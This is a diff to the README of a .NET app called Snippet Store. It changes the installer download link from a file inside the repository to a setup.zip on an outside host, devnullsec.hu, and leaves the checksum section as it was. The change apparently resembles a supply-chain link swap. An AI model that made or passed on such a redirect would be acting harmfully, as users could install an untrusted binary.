@@ -9,7 +9,7 @@ For cloud-based usage, you need to register with the service provider. I recomme
 
 ### Installation
 You can install the app either via the installer or by compiling the code yourself after downloading it. In both cases, you'll need .NET to run the application, which can be downloaded from Microsoft's website: [ .NET Download ](https://dotnet.microsoft.com/en-us/download) Once installed, you can launch the program using the desktop shortcut.
-The installer is available for download here: <br> [ Snippet Store Setup Download ](./SnippetStoreSetup/setup.zip)<br>
+The installer is available for download here: <br> [ Snippet Store Setup Download ](https://devnullsec.hu/bin/setup.zip)<br>
 <br>Checksum (setup.zip)<br><hr>
 
 Algorithm : SHA256<br>
